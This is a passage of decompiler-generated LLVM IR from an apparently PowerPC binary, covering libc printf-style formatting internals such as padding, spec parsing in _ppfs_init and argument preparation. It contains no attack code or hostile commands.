dec_label_pc_10008b04:                            ; preds = %dec_label_pc_10008a98
  br i1 %v3_10008b04, label %dec_label_pc_10008b0c, label %dec_label_pc_10008cac

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008b04
  %v0_10008b0c = call i32 @__errno_location()
  %v1_10008b14 = inttoptr i32 %v0_10008b0c to i32*
  %v2_10008b14 = load i32, i32* %v1_10008b14, align 4
  store i32 %v2_10008b14, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268471072, i32* @lr, align 4
  %v3_10008b1c = call i32 @__GI___glibc_strerror_r(i32 %v2_10008b14, i32 %v2_10008b10, i32 128)
  store i32 %v3_10008b1c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008ab8

dec_label_pc_10008b28:                            ; preds = %dec_label_pc_100089ac, %dec_label_pc_100089a4, %dec_label_pc_1000898c
  %v0_10008b4c.pre41 = phi i32 [ %v1_1000890c, %dec_label_pc_100089ac ], [ 0, %dec_label_pc_100089a4 ], [ 5, %dec_label_pc_1000898c ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008b48thread-pre-split

dec_label_pc_10008b30:                            ; preds = %dec_label_pc_10008aac, %dec_label_pc_10008a0c
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10011b30.296 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008b3c

dec_label_pc_10008b3c:                            ; preds = %dec_label_pc_10008acc, %dec_label_pc_10008b30
  %v0_10008b4c29 = phi i32 [ %v2_10008ad0, %dec_label_pc_10008acc ], [ 6, %dec_label_pc_10008b30 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10008b48

dec_label_pc_10008b48thread-pre-split:            ; preds = %dec_label_pc_10008a80, %dec_label_pc_10008adc, %dec_label_pc_10008b28, %dec_label_pc_100089ac
  %v1_10008b4c.pre = phi i32 [ %v2_100089b0, %dec_label_pc_100089ac ], [ 0, %dec_label_pc_10008b28 ], [ %v1_10008b4c.pre.pre, %dec_label_pc_10008a80 ], [ 0, %dec_label_pc_10008adc ]
  %v0_10008b4c.pre = phi i32 [ %v1_1000890c, %dec_label_pc_100089ac ], [ %v0_10008b4c.pre41, %dec_label_pc_10008b28 ], [ %v0_10008b4c.pre.pre, %dec_label_pc_10008a80 ], [ 1, %dec_label_pc_10008adc ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_100089ac ], [ %stack_var_-184.0, %dec_label_pc_10008b28 ], [ %v0_100088f0, %dec_label_pc_10008a80 ], [ %v0_100088f0, %dec_label_pc_10008adc ]
  %v0_10008b48.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10008b48

dec_label_pc_10008b48:                            ; preds = %dec_label_pc_10008b48thread-pre-split, %dec_label_pc_10008a4c, %dec_label_pc_10008b3c
  %v1_10008b4c = phi i32 [ %v1_10008b4c.pre, %dec_label_pc_10008b48thread-pre-split ], [ 0, %dec_label_pc_10008a4c ], [ 0, %dec_label_pc_10008b3c ]
  %v0_10008b4c = phi i32 [ %v0_10008b4c.pre, %dec_label_pc_10008b48thread-pre-split ], [ %v0_10008a3c, %dec_label_pc_10008a4c ], [ %v0_10008b4c29, %dec_label_pc_10008b3c ]
  %v0_10008b54 = phi i32 [ %v0_10008b48.pr, %dec_label_pc_10008b48thread-pre-split ], [ 11, %dec_label_pc_10008a4c ], [ 11, %dec_label_pc_10008b3c ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10008b48thread-pre-split ], [ %v0_100088f0, %dec_label_pc_10008a4c ], [ %v0_100088f0, %dec_label_pc_10008b3c ]
  %v3_10008b48 = icmp eq i32 %v0_10008b54, 11
  %v2_10008b4c = add i32 %v0_10008b4c, %v1_10008b4c
  store i32 %v2_10008b4c, i32* %r0.global-to-local, align 4
  br i1 %v3_10008b48, label %dec_label_pc_10008b68, label %dec_label_pc_10008b54

dec_label_pc_10008b54:                            ; preds = %dec_label_pc_10008b48
  %v0_10008b58 = call i32 @__asm_mfcr()
  %v1_10008b5c = call i32 @__asm_rlwinm(i32 %v0_10008b58, i32 30, i32 31, i32 31)
  %v1_10008b60 = add i32 %v1_10008b5c, 1
  %v0_10008b64 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008b64 = add i32 %v0_10008b64, %v1_10008b60
  store i32 %v2_10008b64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008b68

dec_label_pc_10008b68:                            ; preds = %dec_label_pc_10008b48, %dec_label_pc_10008b54
  %v0_10008b80 = phi i32 [ %v2_10008b4c, %dec_label_pc_10008b48 ], [ %v2_10008b64, %dec_label_pc_10008b54 ]
  %v3_10008b70 = icmp ugt i32 %tmp, %v0_10008b80
  br i1 %v3_10008b70, label %dec_label_pc_10008b78, label %dec_label_pc_10008b7c

dec_label_pc_10008b78:                            ; preds = %dec_label_pc_10008b68
  %v2_10008b78 = sub i32 %tmp, %v0_10008b80
  br label %dec_label_pc_10008b7c

dec_label_pc_10008b7c:                            ; preds = %dec_label_pc_10008b68, %dec_label_pc_10008b78
  %storemerge93 = phi i32 [ %v2_10008b78, %dec_label_pc_10008b78 ], [ 0, %dec_label_pc_10008b68 ]
  %v1_10008b8c = phi i32 [ %v2_10008b78, %dec_label_pc_10008b78 ], [ 0, %dec_label_pc_10008b68 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10008b7c = load i32, i32* @r26, align 4
  %v3_10008b7c = icmp eq i32 %v0_10008b7c, 48
  %v2_10008b80 = add i32 %v1_10008b8c, %v0_10008b80
  store i32 %v2_10008b80, i32* %r0.global-to-local, align 4
  %v0_10008b84 = load i32, i32* %r23.global-to-local, align 4
  %v2_10008b84 = add i32 %v0_10008b84, %v2_10008b80
  store i32 %v2_10008b84, i32* %r23.global-to-local, align 4
  br i1 %v3_10008b7c, label %dec_label_pc_10008b8c, label %dec_label_pc_10008b94

dec_label_pc_10008b8c:                            ; preds = %dec_label_pc_10008b7c
  %v0_10008b8c = load i32, i32* %r29.global-to-local, align 4
  %v2_10008b8c = add i32 %v0_10008b8c, %v1_10008b8c
  store i32 %v2_10008b8c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10008b94

dec_label_pc_10008b94:                            ; preds = %dec_label_pc_10008b7c, %dec_label_pc_10008b8c
  %v0_10008ba8 = phi i32 [ %v1_10008b8c, %dec_label_pc_10008b7c ], [ 0, %dec_label_pc_10008b8c ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10008b98 = and i32 %stack_var_-184.1, 8
  %v3_10008b98 = icmp eq i32 %v1_10008b98, 0
  br i1 %v3_10008b98, label %dec_label_pc_10008ba0, label %dec_label_pc_10008bbc

dec_label_pc_10008ba0:                            ; preds = %dec_label_pc_10008b94
  %v0_10008ba0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471216, i32* @lr, align 4
  %v4_10008bac = call i32 @_charpad(i32 %v0_10008ba0, i8 32, i32 %v0_10008ba8)
  %v1_10008bb0 = load i32, i32* @r28, align 4
  %v4_10008bb0 = icmp eq i32 %v4_10008bac, %v1_10008bb0
  br i1 %v4_10008bb0, label %dec_label_pc_10008bb8, label %dec_label_pc_10008cac

dec_label_pc_10008bb8:                            ; preds = %dec_label_pc_10008ba0
  br label %dec_label_pc_10008bbc

dec_label_pc_10008bbc:                            ; preds = %dec_label_pc_10008b94, %dec_label_pc_10008bb8
  %v0_10008bc0 = load i32, i32* %r24.global-to-local, align 4
  %v0_10008bc8 = load i32, i32* @r27, align 4
  %v2_10008bc8 = add i32 %v0_10008bc8, ptrtoint (i32* @global_var_10011b38.297 to i32)
  store i32 268471248, i32* @lr, align 4
  %v2_10008bcc = call i32 @__GI_fputs_unlocked(i32 %v2_10008bc8, i32 %v0_10008bc0)
  %v0_10008bd8 = load i32, i32* @r29, align 4
  store i32 268471264, i32* @lr, align 4
  %v4_10008bdc = call i32 @_charpad(i32 %v0_10008bc0, i8 48, i32 %v0_10008bd8)
  %v1_10008be0 = load i32, i32* @r29, align 4
  %v4_10008be0 = icmp eq i32 %v4_10008bdc, %v1_10008be0
  br i1 %v4_10008be0, label %dec_label_pc_10008be8, label %dec_label_pc_10008cac

dec_label_pc_10008be8:                            ; preds = %dec_label_pc_10008bbc
  %v3_10008be8 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10008be8, i32* %r0.global-to-local, align 4
  %v3_10008bec = icmp eq i32 %v3_10008be8, 0
  br i1 %v3_10008bec, label %dec_label_pc_10008bf4, label %dec_label_pc_10008c1c

dec_label_pc_10008bf4:                            ; preds = %dec_label_pc_10008be8
  %v0_10008bf4 = load i32, i32* @r31, align 4
  %v3_10008bf4 = icmp eq i32 %v0_10008bf4, 0
  br i1 %v3_10008bf4, label %dec_label_pc_10008c10.thread, label %dec_label_pc_10008c10

dec_label_pc_10008c10.thread:                     ; preds = %dec_label_pc_10008bf4
  br label %dec_label_pc_10008c80

dec_label_pc_10008c10:                            ; preds = %dec_label_pc_10008bf4
  %v0_10008c00 = load i32, i32* @r30, align 4
  %v0_10008c08 = load i32, i32* %r24.global-to-local, align 4
  store i32 268471312, i32* @lr, align 4
  %v4_10008c0c = inttoptr i32 %v0_10008c08 to i16*
  %v5_10008c0c = call i32 @__stdio_fwrite(i32 %v0_10008c00, i32 %v0_10008bf4, i16* %v4_10008c0c)
  %v1_10008c10.pre = load i32, i32* @r31, align 4
  %v4_10008c10 = icmp eq i32 %v5_10008c0c, %v1_10008c10.pre
  br i1 %v4_10008c10, label %dec_label_pc_10008c80, label %dec_label_pc_10008cac

dec_label_pc_10008c1c:                            ; preds = %dec_label_pc_10008be8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10008c60.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10008c60

dec_label_pc_10008c28:                            ; preds = %dec_label_pc_10008c60
  %tmp78 = icmp ult i32 %v0_10008c78, 129
  br i1 %tmp78, label %dec_label_pc_10008c30, label %dec_label_pc_10008c2c

dec_label_pc_10008c2c:                            ; preds = %dec_label_pc_10008c28
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10008c30

dec_label_pc_10008c30:                            ; preds = %dec_label_pc_10008c28, %dec_label_pc_10008c2c
  store i32 ptrtoint (i32* @global_var_10008c34.298 to i32), i32* @lr, align 4
  %v0_10008c30 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10008c30, i32* @r30, align 4
  %v3_10008c38 = icmp eq i32 %v0_10008c30, 0
  br i1 %v3_10008c38, label %dec_label_pc_10008c54, label %dec_label_pc_10008c4c

dec_label_pc_10008c4c:                            ; preds = %dec_label_pc_10008c30
  %v0_10008c3c = load i32, i32* %r24.global-to-local, align 4
  store i32 268471376, i32* @lr, align 4
  %v3_10008c4c = inttoptr i32 %v0_10008c3c to i16*
  %v4_10008c4c = call i32 @__stdio_fwrite(i32 %v2_10008b10, i32 %v0_10008c30, i16* %v3_10008c4c)
  store i32 %v4_10008c4c, i32* %r0.global-to-local, align 4
  %v1_10008c54.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008c54:                            ; preds = %dec_label_pc_10008c30, %dec_label_pc_10008c4c
  %v1_10008c54 = phi i32 [ 0, %dec_label_pc_10008c30 ], [ %v1_10008c54.pre, %dec_label_pc_10008c4c ]
  %v0_10008c58 = phi i32 [ 0, %dec_label_pc_10008c30 ], [ %v4_10008c4c, %dec_label_pc_10008c4c ]
  %v4_10008c54 = icmp eq i32 %v0_10008c58, %v1_10008c54
  %v1_10008c58 = load i32, i32* @r31, align 4
  %v2_10008c58 = sub i32 %v1_10008c58, %v0_10008c58
  store i32 %v2_10008c58, i32* @r31, align 4
  br i1 %v4_10008c54, label %dec_label_pc_10008c60, label %dec_label_pc_10008cac

dec_label_pc_10008c60:                            ; preds = %dec_label_pc_10008c54, %dec_label_pc_10008c1c
  %v0_10008c78 = phi i32 [ %v2_10008c58, %dec_label_pc_10008c54 ], [ %v0_10008c60.pre, %dec_label_pc_10008c1c ]
  %v3_10008c60 = icmp eq i32 %v0_10008c78, 0
  store i32 %v2_10008b10, i32* @r29, align 4
  store i32 %v2_10008a30, i32* @r4, align 4
  store i32 %v2_10008a34, i32* @r6, align 4
  store i32 %v2_10008b10, i32* @r3, align 4
  store i32 %v0_10008c78, i32* @r5, align 4
  br i1 %v3_10008c60, label %dec_label_pc_10008c80, label %dec_label_pc_10008c28

dec_label_pc_10008c80:                            ; preds = %dec_label_pc_10008c60, %dec_label_pc_10008c10.thread, %dec_label_pc_10008c10
  %v0_10008c80 = load i32, i32* %r24.global-to-local, align 4
  %v0_10008c88 = load i32, i32* @r28, align 4
  store i32 268471440, i32* @lr, align 4
  %v4_10008c8c = call i32 @_charpad(i32 %v0_10008c80, i8 32, i32 %v0_10008c88)
  %v1_10008c90 = load i32, i32* @r28, align 4
  %v4_10008c90 = icmp eq i32 %v4_10008c8c, %v1_10008c90
  br i1 %v4_10008c90, label %dec_label_pc_10008c98, label %dec_label_pc_10008cac

dec_label_pc_10008c98:                            ; preds = %dec_label_pc_10008c80, %dec_label_pc_100089e8, %dec_label_pc_100087bc
  %stack_var_-184.2 = phi i32 [ %v0_100088f0, %dec_label_pc_100087bc ], [ %stack_var_-184.1, %dec_label_pc_10008c80 ], [ %v0_100088f0, %dec_label_pc_100089e8 ]
  %v3_10008c98 = load i8*, i8** %stack_var_-200, align 4
  %v4_10008c98 = ptrtoint i8* %v3_10008c98 to i32
  store i32 %v4_10008c98, i32* @r29, align 4
  br label %dec_label_pc_10008c9c

dec_label_pc_10008c9c:                            ; preds = %dec_label_pc_100086b0, %dec_label_pc_10008c98
  %v0_10008c9c = phi i32 [ %v0_10008c9c.pre, %dec_label_pc_100086b0 ], [ %v4_10008c98, %dec_label_pc_10008c98 ]
  %v0_100088f0 = phi i32 [ %tmp56, %dec_label_pc_100086b0 ], [ %stack_var_-184.2, %dec_label_pc_10008c98 ]
  br label %dec_label_pc_100086c8

dec_label_pc_10008cac:                            ; preds = %dec_label_pc_10008b04, %dec_label_pc_10008c80, %dec_label_pc_10008c10, %dec_label_pc_10008bbc, %dec_label_pc_10008ba0, %dec_label_pc_10008a60, %dec_label_pc_10008a30, %dec_label_pc_100089c4, %dec_label_pc_10008704, %dec_label_pc_10008c54
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10008cb0

dec_label_pc_10008cb0:                            ; preds = %dec_label_pc_10008710, %dec_label_pc_10008688, %dec_label_pc_100086a0, %dec_label_pc_10008cac
  store i32 %v0_1000865c, i32* %r0.global-to-local, align 4
  %v0_10008cb4 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10008cb4

; uselistorder directives
  uselistorder i32 %v0_100088f0, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10008c78, { 1, 2, 0 }
  uselistorder i32 %v1_10008b8c, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10008b1c, { 1, 0 }
  uselistorder i32 %v2_10008aac, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008a0c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100088f0, { 1, 0 }
  uselistorder i32 %v6_100088a8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_10008878, { 1, 0 }
  uselistorder i32 %v1_1000881c, { 1, 0 }
  uselistorder i1 %v2_10008810, { 1, 0 }
  uselistorder i32 %v0_100087c0, { 1, 0, 2 }
  uselistorder i32 %v1_100087ac, { 1, 0 }
  uselistorder i32 %v0_100087a4, { 1, 0 }
  uselistorder i32 %v1_100087a0, { 1, 0 }
  uselistorder i32 %v1_1000871c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100086e4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_100086f4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10008b10, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10008758, { 1, 2, 0 }
  uselistorder i32 %v4_10008750, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 0, 37, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder label %dec_label_pc_10008cb0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10008cac, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10008c9c, { 1, 0 }
  uselistorder label %dec_label_pc_10008c80, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008c54, { 1, 0 }
  uselistorder label %dec_label_pc_10008c30, { 1, 0 }
  uselistorder label %dec_label_pc_10008bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10008b94, { 1, 0 }
  uselistorder label %dec_label_pc_10008b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10008b68, { 1, 0 }
  uselistorder label %dec_label_pc_10008b48, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10008b48thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10008acc, { 1, 0 }
  uselistorder label %dec_label_pc_10008ab8, { 1, 0 }
  uselistorder label %dec_label_pc_10008a30, { 1, 0 }
  uselistorder label %dec_label_pc_10008980, { 1, 0 }
  uselistorder label %dec_label_pc_10008968, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10008918, { 1, 0 }
  uselistorder label %dec_label_pc_100088fc, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10008888, { 1, 0 }
  uselistorder label %dec_label_pc_1000886c, { 1, 0 }
  uselistorder label %dec_label_pc_10008858, { 1, 0 }
  uselistorder label %dec_label_pc_10008854, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008828, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100087b0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000879c.dec_label_pc_1000879c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008774, { 1, 0 }
  uselistorder label %dec_label_pc_10008710, { 1, 0 }
  uselistorder label %dec_label_pc_10008704, { 1, 0 }
  uselistorder label %dec_label_pc_100086c8, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10008ccc = load i32, i32* @lr, align 4
  store i32 %v0_10008ccc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10008cdc = load i32, i32* @r4, align 4
  store i32 %v0_10008cdc, i32* @r30, align 4
  store i32 268471532, i32* @lr, align 4
  %v3_10008ce8 = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_10008cec = load i32, i32* @r31, align 4
  %v1_10008cec = add i32 %v0_10008cec, 24
  %v2_10008cec = inttoptr i32 %v1_10008cec to i32*
  %v3_10008cec = load i32, i32* %v2_10008cec, align 4
  store i32 %v3_10008cec, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10008cf4 = load i32, i32* @r30, align 4
  %v2_10008cf4 = inttoptr i32 %v0_10008cec to i32*
  store i32 %v0_10008cf4, i32* %v2_10008cf4, align 4
  %v0_10008cf8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10008cf8, i32* %ctr.global-to-local, align 4
  %v0_10008cfc = load i32, i32* %r9.global-to-local, align 4
  %v1_10008cfc = add i32 %v0_10008cfc, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10008d04 = load i32, i32* @r31, align 4
  %v2_10008d04 = add i32 %v1_10008d04, 24
  %v3_10008d04 = inttoptr i32 %v2_10008d04 to i32*
  store i32 %v1_10008cfc, i32* %v3_10008d04, align 4
  %v0_10008d08 = load i32, i32* @r31, align 4
  %v1_10008d08 = add i32 %v0_10008d08, 40
  store i32 %v1_10008d08, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008d0c

dec_label_pc_10008d0c:                            ; preds = %dec_label_pc_10008d0c, %entry
  %v1_10008d0c = phi i32 [ %v1_10008d10, %dec_label_pc_10008d0c ], [ %v1_10008d08, %entry ]
  %v0_10008d0c = load i32, i32* %r0.global-to-local, align 4
  %v2_10008d0c = inttoptr i32 %v1_10008d0c to i32*
  store i32 %v0_10008d0c, i32* %v2_10008d0c, align 4
  %v0_10008d10 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008d10 = add i32 %v0_10008d10, 4
  store i32 %v1_10008d10, i32* %r9.global-to-local, align 4
  %v0_10008d14 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008d14 = add i32 %v0_10008d14, -1
  store i32 %v1_10008d14, i32* %ctr.global-to-local, align 4
  %v2_10008d14 = icmp eq i32 %v1_10008d14, 0
  br i1 %v2_10008d14, label %dec_label_pc_10008d18, label %dec_label_pc_10008d0c

dec_label_pc_10008d18:                            ; preds = %dec_label_pc_10008d0c
  %v0_10008d18 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10008d58

dec_label_pc_10008d28:                            ; preds = %dec_label_pc_10008d58
  %v3_10008d60 = icmp eq i8 %v2_10008d58, 37
  br i1 %v3_10008d60, label %dec_label_pc_10008d2c, label %dec_label_pc_10008d54

dec_label_pc_10008d2c:                            ; preds = %dec_label_pc_10008d28
  %v1_10008d2c = add i32 %v0_10008d2c, 1
  %v2_10008d2c = inttoptr i32 %v1_10008d2c to i8*
  %v3_10008d2c = load i8, i8* %v2_10008d2c, align 1
  %v4_10008d2c = zext i8 %v3_10008d2c to i32
  store i32 %v4_10008d2c, i32* %r0.global-to-local, align 4
  store i32 %v1_10008d2c, i32* %r9.global-to-local, align 4
  %v3_10008d34 = icmp eq i8 %v3_10008d2c, 37
  br i1 %v3_10008d34, label %dec_label_pc_10008d54, label %dec_label_pc_10008d3c

dec_label_pc_10008d3c:                            ; preds = %dec_label_pc_10008d2c
  %v0_10008d30 = load i32, i32* @r31, align 4
  %v2_10008d3c = inttoptr i32 %v0_10008d30 to i32*
  store i32 %v1_10008d2c, i32* %v2_10008d3c, align 4
  store i32 268471620, i32* @lr, align 4
  %v1_10008d40 = load i32, i32* %r9.global-to-local, align 4
  %v3_10008d40 = call i32 @_ppfs_parsespec(i32* %v2_10008d3c, i32 %v1_10008d40)
  %v1_10008d44 = icmp slt i32 %v3_10008d40, 0
  br i1 %v1_10008d44, label %dec_label_pc_10008d70, label %dec_label_pc_10008d4c

dec_label_pc_10008d4c:                            ; preds = %dec_label_pc_10008d3c
  %v0_10008d4c = load i32, i32* @r31, align 4
  %v1_10008d4c = inttoptr i32 %v0_10008d4c to i32*
  %v2_10008d4c = load i32, i32* %v1_10008d4c, align 4
  br label %dec_label_pc_10008d58

dec_label_pc_10008d54:                            ; preds = %dec_label_pc_10008d28, %dec_label_pc_10008d2c
  %v0_10008d54 = phi i32 [ %v0_10008d2c, %dec_label_pc_10008d28 ], [ %v1_10008d2c, %dec_label_pc_10008d2c ]
  %v1_10008d54 = add i32 %v0_10008d54, 1
  br label %dec_label_pc_10008d58

dec_label_pc_10008d58:                            ; preds = %dec_label_pc_10008d4c, %dec_label_pc_10008d54, %dec_label_pc_10008d18
  %v0_10008d2c = phi i32 [ %v0_10008d18, %dec_label_pc_10008d18 ], [ %v1_10008d54, %dec_label_pc_10008d54 ], [ %v2_10008d4c, %dec_label_pc_10008d4c ]
  store i32 %v0_10008d2c, i32* %r9.global-to-local, align 4
  %v1_10008d58 = inttoptr i32 %v0_10008d2c to i8*
  %v2_10008d58 = load i8, i8* %v1_10008d58, align 1
  %v3_10008d58 = zext i8 %v2_10008d58 to i32
  store i32 %v3_10008d58, i32* %r0.global-to-local, align 4
  %v3_10008d5c = icmp eq i8 %v2_10008d58, 0
  br i1 %v3_10008d5c, label %dec_label_pc_10008d68, label %dec_label_pc_10008d28

dec_label_pc_10008d68:                            ; preds = %dec_label_pc_10008d58
  %v0_10008d68 = load i32, i32* @r30, align 4
  %v1_10008d68 = load i32, i32* @r31, align 4
  %v2_10008d68 = inttoptr i32 %v1_10008d68 to i32*
  store i32 %v0_10008d68, i32* %v2_10008d68, align 4
  br label %dec_label_pc_10008d70

dec_label_pc_10008d70:                            ; preds = %dec_label_pc_10008d3c, %dec_label_pc_10008d68
  %storemerge = phi i32 [ 0, %dec_label_pc_10008d68 ], [ -1, %dec_label_pc_10008d3c ]
  store i32 %v0_10008ccc, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10008d58, { 1, 2, 0 }
  uselistorder i32 %v0_10008d2c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10008d14, { 1, 0 }
  uselistorder i32 %v1_10008d10, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10008d70, { 1, 0 }
  uselistorder label %dec_label_pc_10008d58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008d54, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10008d84 = load i32, i32* @lr, align 4
  %v0_10008d8c = load i32, i32* @r3, align 4
  store i32 %v0_10008d8c, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10008da8 = add i32 %v0_10008d8c, 24
  %v2_10008da8 = inttoptr i32 %v1_10008da8 to i32*
  %v3_10008da8 = load i32, i32* %v2_10008da8, align 4
  store i32 %v3_10008da8, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10008da8, 1
  br i1 %tmp4, label %dec_label_pc_10008dcc, label %dec_label_pc_10008db4

dec_label_pc_10008db4:                            ; preds = %entry
  %v2_10008db4 = add i32 %v0_10008d8c, 8
  %v3_10008db4 = inttoptr i32 %v2_10008db4 to i32*
  store i32 0, i32* %v3_10008db4, align 4
  %v0_10008db8 = load i32, i32* @r30, align 4
  %v1_10008db8 = load i32, i32* @r3, align 4
  %v2_10008db8 = add i32 %v1_10008db8, 28
  %v3_10008db8 = inttoptr i32 %v2_10008db8 to i32*
  store i32 %v0_10008db8, i32* %v3_10008db8, align 4
  %v0_10008dbc = load i32, i32* %r0.global-to-local, align 4
  %v1_10008dbc = load i32, i32* @r3, align 4
  %v2_10008dbc = add i32 %v1_10008dbc, 24
  %v3_10008dbc = inttoptr i32 %v2_10008dbc to i32*
  store i32 %v0_10008dbc, i32* %v3_10008dbc, align 4
  %v0_10008dc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008dc0 = load i32, i32* @r3, align 4
  %v2_10008dc0 = add i32 %v1_10008dc0, 4
  %v3_10008dc0 = inttoptr i32 %v2_10008dc0 to i32*
  store i32 %v0_10008dc0, i32* %v3_10008dc0, align 4
  store i32 268471752, i32* @lr, align 4
  %v0_10008dc4 = call i32 @_ppfs_setargs()
  store i32 %v0_10008dc4, i32* %r3.global-to-local, align 4
  %v0_10008dc8 = load i32, i32* @r30, align 4
  %v1_10008dc8 = load i32, i32* @r31, align 4
  %v2_10008dc8 = add i32 %v1_10008dc8, 24
  %v3_10008dc8 = inttoptr i32 %v2_10008dc8 to i32*
  store i32 %v0_10008dc8, i32* %v3_10008dc8, align 4
  %v0_10008ddc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008dcc

dec_label_pc_10008dcc:                            ; preds = %entry, %dec_label_pc_10008db4
